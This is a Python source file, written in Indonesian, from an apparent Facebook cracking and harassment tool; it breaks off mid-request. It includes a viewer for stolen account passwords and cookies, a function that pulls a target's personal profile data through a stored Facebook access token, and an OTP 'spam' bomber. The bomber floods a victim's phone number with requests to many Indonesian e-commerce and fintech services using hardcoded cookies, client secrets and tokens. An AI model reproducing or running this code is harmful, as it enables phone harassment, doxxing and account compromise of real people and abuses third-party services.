    ###----------[ CEK HASIL CRACK ]---------- ###
    def cek_hasil(self):
        prints(
            Panel(
                f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack ok
[{color_text}02{P2}]. lihat akun hasil crack cp""",
                width=60,
                style=f"{color_panel}",
            )
        )
        ask = console.input(f" {H2}• {P2}masukan pilihan : ")
        if ask in ["1", "01"]:
            folder = "OK"
        else:
            folder = "CP"

        ###----------[ PILIH FILE ]---------- ###
        dirs = os.listdir(folder)
        prints(
            Panel(
                f"""{P2} berhasil menemukan {len(dirs)} file hasil crack ok""",
                width=60,
                style=f"{color_panel}",
            )
        )
        num = 0
        for fil in dirs:
            num += 1
            self.file.append(fil)
            totalakun = open(f"{folder}/{fil}", "r").read().splitlines()
            self.listfile.append(
                Panel(
                    f"{P2}[{color_text}0{num}{P2}]",
                    width=10,
                    title=f"{P2}nomer",
                    style=f"{color_panel}",
                )
            )
            self.listfile.append(
                Panel(
                    f"{P2}{fil}", width=35, title=f"{P2}tanggal", style=f"{color_panel}"
                )
            )
            self.listfile.append(
                Panel(
                    f"{P2}{len(totalakun)} akun",
                    width=28,
                    title=f"{P2}total akun",
                    style=f"{color_panel}",
                )
            )
        console.print(Columns(self.listfile))
        prints(
            Panel(
                f"""{P2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",
                width=60,
                style=f"{color_panel}",
            )
        )
        result = console.input(f" {H2}• {P2}masukan angka : ")

        ###----------[ MULAI CEK ]---------- ###
        try:
            files = self.file[int(result) - 1]
            totalhasil = open(f"{folder}/{files}", "r").read().splitlines()
        except:
            prints(
                Panel(
                    f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",
                    width=60,
                    style=f"{color_panel}",
                )
            )
            exit()
        nama_file = (f"{files}").replace("-", " ").replace(".txt", "")
        prints(
            Panel(
                f"""{P2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",
                width=60,
                style=f"{color_panel}",
            )
        )
        for akun in totalhasil:
            user = akun.split("|")[0]
            pw = akun.split("|")[1]
            tree = Tree(" ", guide_style=f"{color_panel}")
            if folder == "OK":
                cookie = akun.split("|")[1]
                tree.add(f"\r{H2}{user}{P2} ")
                tree.add(Panel(f"{H2}{cookie}{P2}", style=f"{color_panel}"))
            else:
                tree.add(f"\r{K2}{user}|{pw}{P2} ")
            prints(tree)
        prints(
            Panel(
                f"""{P2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",
                width=60,
                style=f"{color_panel}",
            )
        )
        exit()

    ###----------[ GANTI WARNA TEMA ]---------- ###
    def ganti_tema(self):
        prints(
            Panel(
                f"""{P2}[{color_text}01{P2}]. ganti warna tema merah  [{color_text}06{P2}]. ganti warna tema pink
[{color_text}02{P2}]. ganti warna tema hijau  [{color_text}07{P2}]. ganti warna tema cyan
[{color_text}03{P2}]. ganti warna tema kuning [{color_text}08{P2}]. ganti warna tema putih
[{color_text}04{P2}]. ganti warna tema biru   [{color_text}09{P2}]. ganti warna tema orange
[{color_text}05{P2}]. ganti warna tema ungu   [{color_text}10{P2}]. ganti warna tema abu2""",
                width=60,
                style=f"{color_panel}",
            )
        )
        ask = console.input(f" {H2}• {P2}pilih tema : ")
        if ask in ["01", "1"]:
            warna = "[#FF0000]"
            teks = "merah"
        elif ask in ["02", "2"]:
            warna = "[#00FF00]"
            teks = "hijau"
        elif ask in ["03", "3"]:
            warna = "[#FFFF00]"
            teks = "kuning"
        elif ask in ["04", "4"]:
            warna = "[#00C8FF]"
            teks = "biru"
        elif ask in ["05", "5"]:
            warna = "[#AF00FF]"
            teks = "ungu"
        elif ask in ["06", "6"]:
            warna = "[#FF00FF]"
            teks = "pink"
        elif ask in ["07", "7"]:
            warna = "[#00FFFF]"
            teks = "cyan"
        elif ask in ["08", "8"]:
            warna = "[#FFFFFF]"
            teks = "putih"
        elif ask in ["09", "9"]:
            warna = "[#FF8F00]"
            teks = "orange"
        elif ask in ["10"]:
            warna = "[#AAAAAA]"
            teks = "abu-abu"
        open("data/theme_color", "w").write(
            warna + "|" + warna.replace("[", "").replace("]", "")
        )
        prints(
            Panel(
                f"""{H2}berhasil mengganti tema ke {teks}, silahkan mulai ulang tools""",
                width=60,
                style=f"{color_panel}",
            )
        )
        sys.exit()

    ###----------[ TAMPILKAN COOKIE ]---------- ###
    def tampil_cookie(self):
        cookie = open(".vipercok.txt", "r").read()
        now = datetime.now()
        hari = now.day + int(30)
        if hari > 30:
            hari = hari - 30
        bulan = now.month + 1
        if bulan > 12:
            bulan = bulan - 12
        tahun = now.year + 1
        if tahun > 1:
            tahun = now.year
        data = date(year=tahun, month=bulan, day=hari)
        aktif = data.strftime("%d %B %Y")
        console.print(f" {H2}• {P2}aktif sampai : {aktif}")
        prints(Panel(f"{H2}{cookie}", width=60, style=f"{color_panel}"))
        sys.exit()
def target():
    try:
        toket=open('.vipertok.txt','r').read()
    except KeyError:
        print("\n[!] Token Invalid")
        os.system('rm -rf .vipertok.txt')
        login()
    print(' %s '%(N))
    idt = console.input(f" {H2}• {P2}Masukan ID Target : ")
    try:
        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        zy = json.loads(zx.text)
        
    except KeyError:
        print(" [!] ID NOT found");exit()
    try:
        nm = zy["name"]
    except KeyError:
        nm = ("-")
    try:
        nd = zy["first_name"]
    except KeyError:
        nd = ("-")
    try:
        nt = zy["middle_name"]
    except KeyError:
        nt = ("-")
    try:
        nb = zy["last_name"]
    except KeyError:
        nb = ("-")
    try:
        ut = zy["birthday"]
    except KeyError:
        ut = ("-")
    try:
        gd = zy["gender"]
    except KeyError:
        gd = ("-")
    try:
        em = zy["email"]
    except KeyError:
        em = ("-")
    try:
        lk = zy["link"]
    except KeyError:
        lk = ("-")
    try:
        us = zy["username"]
    except KeyError:
        us = ("-")
    try:
        rg = zy["religion"]
    except KeyError:
        rg = ("-")
    try:
        rl = zy["relationship_status"]
    except KeyError:
        rl = ("-")
    try:
        rls = zy["significant_other"]["name"]
    except KeyError:
        rls = ("-")
    try:
        lc = zy["location"]["name"]
    except KeyError:
        lc = ("-")
    try:
        ht = zy["hometown"]["name"]
    except KeyError:
        ht = ("-")
    try:
        ab = zy["about"]
    except KeyError:
        ab = ("-")
    try:
        lo = zy["locale"]
    except KeyError:
        lo = ("-")
    try:
        scl = zy["school"]["name"]
    except KeyError:
        scl = ("-")
    Console().print(f" {K2}• ➪ {P2}Name : " + nm)
    Console().print(f" {K2}• ➪ {P2}First Name : " + nd)
    Console().print(f" {K2}• ➪ {P2}Middle Name : " + nt)
    Console().print(f" {K2}• ➪ {P2}Last Name : " + nb)
    Console().print(f" {K2}• ➪ {P2}Sekolah : " + scl)
    Console().print(f" {K2}• ➪ {P2}Birthday : " + ut)
    Console().print(f" {K2}• ➪ {P2}Gender : " + gd)
    Console().print(f" {K2}• ➪ {P2}Email : " + em)
    Console().print(f" {K2}• ➪ {P2}Link : " + lk)
    Console().print(f" {K2}• ➪ {P2}Username : " + us)
    Console().print(f" {K2}• ➪ {P2}Religion : " + rg)
    Console().print(f" {K2}• ➪ {P2}Relationship Status : " + rl)
    Console().print(f" {K2}• ➪ {P2}Relationship With : " + rls)
    Console().print(f" {K2}• ➪ {P2}Location : " + lc)
    Console().print(f" {K2}• ➪ {P2}Hometown : " + ht)
    Console().print(f" {K2}• ➪ {P2}About : " + ab)
    Console().print(f" {K2}• ➪ {P2}Locale : " + lo)
    print('')
    Console().print(f" {H2}• {P2}SUKSES MENGECEK AKUN")
    print('')
    
###----------[ BOT ]---------- ###
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count
from requests import get
from bs4 import BeautifulSoup
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel

done = False
results = []


def clear():
    if "linux" in sys.platform.lower():
        os.system("clear")
    elif "win" in sys.platform.lower():
        os.system("cls")


def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()


def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(":")[1]
        Detik = (
            str(Total_Waktu).split(":")[2].replace(".", ",").split(",")[0]
            + ","
            + str(Total_Waktu).split(":")[2].replace(".", ",").split(",")[1][:1]
        )
        print("\n [+] Program Selesai Dalam Waktu %s Menit %s Detik\n" % (Menit, Detik))
    except Exception as e:
        print("\n\n [+] Program Selesai Dalam Waktu 0 Detik\n")


def process_data1():
    sleep(0.10)


def spam():
    try:
        prints(
            Panel(
                f"""{H2}Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx""",
                width=80,
                padding=(0, 6),
                style=f"{color_panel}",
            )
        )
        nomor = console.input(f" {H2}• {P2}Masukan No +62 : ").replace("+62", "")
        for _ in track(range(100), description=f" {H2}• {P2} Sedang Spam..."):
            process_data1()
        tokoko = requests.post(
            "https://api-v2.bukuwarung.com/api/v2/auth/otp/send",
            headers={
                "Host": "api-v2.bukuwarung.com",
                "content-length": "198",
                "sec-ch-ua": '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                "sec-ch-ua-mobile": "?0",
                "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
                "content-type": "application/json",
                "accept": "application/json, text/plain, */*",
                "x-app-version-code": "5050",
                "x-app-version-name": "android",
                "buku-origin": "tokoko",
                "sec-ch-ua-platform": '"Linux"',
                "origin": "https://web.tokoko.id",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://web.tokoko.id/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            data=json.dumps(
                {
                    "action": "LOGIN_OTP",
                    "countryCode": "+62",
                    "deviceId": "test-1",
                    "method": "WA",
                    "phone": nomor,
                    "clientId": "2e3570c6-317e-4524-b284-980e5a4335b6",
                    "clientSecret": "S81VsdrwNUN23YARAL54MFjB2JSV2TLn",
                }
            ),
        ).text
        site = requests.get(
            "https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0"
            + nomor
            + "&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D",
            headers={
                "Connection": "keep-alive",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Origin": "https://accounts.tokopedia.com",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "{acak}",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept-Encoding": "gzip, deflate",
            },
        ).text  # tokped
        search = re.search(
            r"\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>", site
        ).group(
            1
        )  # tokped

        sending = requests.post(
            "https://accounts.tokopedia.com/otp/c/ajax/request-wa",
            headers={
                "Connection": "keep-alive",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Origin": "https://accounts.tokopedia.com",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "{acak}",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept-Encoding": "gzip, deflate",
            },
            data={
                "otp_type": "116",
                "msisdn": "0" + nomor,
                "tk": search,
                "email": "",
                "original_param": "",
                "user_id": "",
                "signature": "",
            },
        ).text  # send requests tokped

        kukis = {
            "cookie": "ajs_anonymous_id=5a3e8670-63ce-4348-8dca-641748d7d767",
            "cookie": "_ALGOLIA=anonymous-2b34b4e4-c817-499f-a0d4-5930ffbaf7ff",
            "cookie": "_fbp=fb.1.1662046677088.183334261",
            "cookie": 'g_state={"i_p":1662053880779,"i_l":1}',
            "cookie": "_hjSessionUser_1895264=eyJpZCI6IjBkNWYwMjNjLWNjMGEtNTVmNi1hYTNkLTgwZmJjYTU5N2RhNiIsImNyZWF0ZWQiOjE2NjIwNDY2NzY2NTgsImV4aXN0aW5nIjp0cnVlfQ==",
            "cookie": "amp_7c6549=BuD_ETdrbio9LDUB2TB6V-...1gc3r9m4s.1gc3r9m4s.0.0.0",
            "cookie": "_clck=1nxlj0s|1|f4l|0",
            "cookie": "tml_t=ab85e71e-ddd0-4317-a14b-1e5a6c202a43",
            "cookie": "amp_4b05bb=jrGWubrrFNjGvlqLBgVTH_...1glb1ck7f.1glb1ck7f.0.0.0",
            "cookie": "__cf_bm=Ee0IbDXhZjy2AiRtIyyK7OhmiIN9OawLBwVyRHC3DLQ-1672186583-0-AdaNbL4+xeIXNO1UbfZ1feHhHZCjnQlkjgARFkyoFJQ117Za5erTm4q2gKEuogBEtNqcxWbNCX/EoBa9wp7auxY=",
            "cookie": "_gcl_aw=GCL.1672186586.CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE",
            "cookie": "_gcl_au=1.1.2101568662.1672186586",
            "cookie": 'utm={"utm_source":"Google","utm_medium":"Search","utm_campaign":"EN_AlwaysOn_PureBrand_Exact_Brand_","utm_term":"Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_"}',
            "cookie": "attribution=Google",
            "cookie": 'ucif={"src":"Google","med":"Search","camp":"EN_AlwaysOn_PureBrand_Exact_Brand_","cont":"carsome","term":"Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_"}',
            "cookie": "attribution=Google",
            "cookie": "_hjIncludedInSessionSample=0",
            "cookie": "_hjSession_1895264=eyJpZCI6ImE0YTAzNmVkLTBiNzctNGYzOC1hNWZiLTUzODEyM2RlNjU0NCIsImNyZWF0ZWQiOjE2NzIxODY1ODkxMDcsImluU2FtcGxlIjpmYWxzZX0=",
            "cookie": "_hjAbsoluteSessionInProgress=1",
            "cookie": "moe_uuid=30b62d3f-6f5c-46a2-b324-79bb5fdde264",
            "cookie": "_gid=GA1.2.1272855920.1672186591",
            "cookie": "_gac_UA-70043720-4=1.1672186591.CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE",
            "cookie": "_gat_UA-70043720-4=1",
            "cookie": "_ga=GA1.1.651678291.1662046676",
            "cookie": "_ga_L3ZY5XJB08=GS1.1.1672186591.5.0.1672186592.59.0.0",
            "cookie": "tml_s=3ba17acd-ecae-4716-b725-d4176b4c88a1",
            "cookie": "_uetsid=e3fb7eb0864411eda3df3b3860185a56",
            "cookie": "_uetvid=0f040fa02a0c11ed8727e1811f9a3cb3",
        }  # kukis carsome
        carsome = requests.post(
            "https://www.carsome.id/website/login/sendSMS",
            headers={
                "Host": "www.carsome.id",
                "content-length": "38",
                "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                "x-language": "id",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
                "content-type": "application/json",
                "accept": "application/json, text/plain, */*",
                "country": "ID",
                "x-amplitude-device-id": "jrGWubrrFNjGvlqLBgVTH_",
                "sec-ch-ua-platform": '"Android"',
                "origin": "https://www.carsome.id",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.carsome.id/jual-mobil-bekas?utm_source=Google&utm_medium=Search&utm_campaign=EN_AlwaysOn_PureBrand_Exact_Brand_&utm_term=Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_&utm_content=carsome&gclid=CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            cookies=kukis,
            data=json.dumps({"username": nomor, "optType": 1}),
        ).text
        bibit = requests.post(
            "https://api.bibit.id/auth/register/phone",
            headers={
                "Host": "api.bibit.id",
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "sec-ch-ua-mobile": "?1",
                "x-platform": "web",
                "user-agent": "Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "origin": "https://app.bibit.id",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.bibit.id/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            data=json.dumps(
                {
                    "code": "62",
                    "phone": nomor,
                    "via": "whatsapp",
                    "recaptcha_token": "",
                    "recaptcha_type": "v3",
                }
            ),
        ).text
        cook = {
            "cookie": "_gcl_au=1.1.909457086.1662115605",
            "cookie": "__gtm_campaign_url=https%3A%2F%2Fevermos.com%2Freg%2Fsitelink_daftar%2F%3Fgclid%3DCj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB",
            "cookie": "__gtm_referrer=https%3A%2F%2Fwww.google.com%2F",
            "cookie": "_gid=GA1.2.1927488580.1662115605",
            "cookie": "_gac_UA-127603098-29=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB",
            "cookie": "_gac_UA-127603098-27=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB",
            "cookie": "_gcl_aw=GCL.1662115606.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB",
            "cookie": "_fbp=fb.1.1662115607118.1815022728",
            "cookie": "_ga_E48JMVJVEG=GS1.1.1662115603.1.0.1662115609.0.0.0",
            "cookie": "poptin_old_user=true",
            "cookie": "poptin_user_id=0.42qy01qhmjj",
            "cookie": "evm_client_token=fd0c103b778b2da4bf5cd3520ff64a500f3f1137",
            "cookie": "evm_version=2.48.14",
            "cookie": "utm_tracker=%7B%22source_link%22%3A%22versionb.ea7%22%7D",
            "cookie": "_ga=GA1.2.56596919.1662115604",
            "cookie": "_gat_gtag_UA_127603098_1=1",
            "cookie": "_gat_UA-127603098-1=1",
            "cookie": "_ga_8NN2ZT44WP=GS1.1.1662115616.1.0.1662115619.0.0.0",
            "cookie": "rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX19cj2GvLExMO7pRcRLevWUUYg9hSlCCKEbtmQAzju4RWUWo22yC%2B3dUMBswi22yZpDc2jU3DHURNmVnOfZLpfGzkMpatP9yCh0%3D",
            "cookie": "rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18v21NYtvQDe7sPj6DM6%2BqN8HCmUTTSGrA%3D",
            "cookie": "_gat=1",
            "cookie": "MgidSensorNVis=2",
            "cookie": "MgidSensorHref=https://evermos.com/registration?source_link=versionb.ea7",
            "cookie": "_gat_%5Bobject%20Object%5D=1",
            "cookie": "afUserId=154dedac-a679-4204-8121-fbd290672de8-p",
            "cookie": "AF_SYNC=1662115627689",
            "cookie": "registered_user=%7B%22verificationToken%22%3Anull%2C%22phone%22%3A%2262"
            + nomor
            + "%22%2C%22password%22%3A%22jsjwjwhebe%22%2C%22name%22%3A%22Zgsghshsbs%22%2C%22subDistrictId%22%3A%223175%22%2C%22referral%22%3Anull%7D",
            "cookie": "otp_config=%7B%22action%22%3A%22registration%2FdoRegister%22%2C%22redirectUrl%22%3A%22%2Fcatalog%3FnewUser%3D1%22%7D",
            "cookie": "rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2B%2BfZWMpHNJzHadlZHZva4JNdrFmOCLYIX0Qh5h%2FPDZ8c2htJ%2FhtS9bKg3eddpUadVfLXPe7%2FYiIw%3D%3D",
            "cookie": "amp_e15389=3AYNBj9lB2pDQI8v06V0tC...1gbusvcej.1gbut0lb0.6.0.6",
        }
        Arifa = requests.post(
            "https://evermos.com/api/register/phone-registration",
            headers={
                "Host": "evermos.com",
                "content-length": "25",
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json;charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua-platform": "Android",
                "origin": "https://evermos.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://evermos.com/registration/otp",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            data=json.dumps({"phone": "62" + nomor}),
            cookies=cook,
        ).text
        ruparupa = requests.post(
            "https://wapi.ruparupa.com/auth/generate-otp",
            headers={
                "Host": "wapi.ruparupa.com",
                "content-length": "117",
                "sec-ch-ua-mobile": "?1",
                "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs",
                "content-type": "application/json",
                "x-company-name": "odi",
                "accept": "application/json",
                "informa-b2b": "false",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                "user-platform": "mobile",
                "x-frontend-type": "mobile",
                "sec-ch-ua-platform": "Android",
                "origin": "https://m.ruparupa.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://m.ruparupa.com/verification?page=otp-choices",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            data=json.dumps(
                {
                    "phone": "0" + nomor,
                    "action": "register",
                    "channel": "chat",
                    "email": "",
                    "token": "",
                    "customer_id": "0",
                    "is_resend": 0,
                }
            ),
        ).text
        js = json.dumps(
            [
                {
                    "operationName": "generateOTP",
                    "variables": {
                        "destinationType": "whatsapp",
                        "identity": "+62" + nomor,
                    },
                    "query": "mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}",
                }
            ]
        )
        ken = requests.post(
            "https://www.sayurbox.com/graphql/v1?deduplicate=1",
            headers={
                "Host": "www.sayurbox.com",
                "content-length": "289",
                "sec-ch-ua": '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
                "x-device-info": '{"platform":"web","is_app":false,"is_mobile":true,"device_type":"mobile","device_id":"LWUOU5jfEtY_43IsmFme_","os_name":"Android","os_version":"11","brand":null,"model":null,"client_ip":"::ffff:10.10.212.88","pixel_density":2}',
                "sec-ch-ua-mobile": "?1",
                "authorization": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyMzc2NTc0LCJleHAiOjE2NjQ5Njg1NzQsImlhdCI6MTY2MjM3NjU3NCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjFmOWE0NGI0LTE0MTgtNGIyNC1iYTRkLWU0MTEwN2FjOWU2NSIsInN1YiI6IjRwZUpiTjB5cUpuQkd4NDBfMGVWbWV1S3lkYWQiLCJ1c2VyX2lkIjoiNHBlSmJOMHlxSm5CR3g0MF8wZVZtZXVLeWRhZCJ9.hbvAGWui1gSK26sEzhC9l790_JVobzkR3j82ZPi1hIwflbf-f08WTRbTraE7_6U_Q60QetC0Xk-GR3JndHodWuXvMbi0yIum8ghQ2fGG4ZR5F9RdPWOv0k1v10NyxOxUuWdfVUK_wMqoYZGK4klL2B3InPd-WMra4MhX9JoW91LBtpLx-tm5GLzPytX5hHINiqs6hZnvypbIBGqQr5oQp_ruJNezAfUBtYVmHdUahlJs1j9aD8IDF-86NVGGEfLjOMERi1cet4mf8uJmKn9ScIP18XMQVAdoxJnkVTwPQBOvQsP2EOMyh___hYvpjwe2T4qriGD1lpMgP2cHuf-dxw",
                "content-type": "application/json",
                "accept": "*/*",
                "x-bundle-revision": "6.0",
                "x-sbox-tenant": "sayurbox",
                "x-binary-version": "2.2.1",
                "user-agent": "Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "origin": "https://www.sayurbox.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            data=js,
        ).text
        possing = requests.post(
            "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",
            headers={
                "Host": "www.matahari.com",
                "content-length": "76",
                "x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                "content-type": "application/json",
                "accept": "*/*",
                "x-requested-with": "XMLHttpRequest",
                "sec-ch-ua-platform": "Android",
                "origin": "https://www.matahari.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.matahari.com/customer/account/create/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            data=json.dumps(
                {
                    "otp_request": {
                        "mobile_number": "0" + nomor,
                        "mobile_country_code": "+62",
                    }
                }
            ),
        ).text
        segar = requests.post(
            "https://api-v2.segari.id//v1/otps/generate",
            headers={
                "Host": "api-v2.segari.id",
                "content-length": "30",
                "accept": "application/json, text/plain, */*",
                "x-segari-platform": "web",
                "origin": "https://segari.id",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
                "content-type": "application/json;charset=UTF-8",
                "referer": "https://segari.id/login",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            data=json.dumps({"phoneNumber": nomor}),
        ).text
        al = requests.get(
            "https://www.toyskingdom.co.id/membership/send-otp?cellphone="
            + nomor
            + "&otp_type=register&email=tololbet615%40gmail.com",
            headers={
                "Host": "www.toyskingdom.co.id",
                "Connection": "keep-alive",
                "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                "Accept": "*/*",
                "X-Requested-With": "XMLHttpRequest",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.toyskingdom.co.id/membership/register/+aqXlp409RHHXTQyyGCurg==/zb3+iKnqYXQ86its61Z4Jg==",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
        ).text
        ses = requests.post(
            "https://api.pintarnya.com/api/pk/auth/register/mobile",
            headers={
                "Host": "api.pintarnya.com",
                "content-length": "27",
                "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                "sec-ch-ua-mobile": "?1",
                "authorization": "Bearer undefined",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
                "content-type": "application/json",
                "accept": "application/json, text/plain, */*",
                "platform": "web-kerja",
                "sec-ch-ua-platform": '"Android"',
                "origin": "https://pintarnya.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://pintarnya.com/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
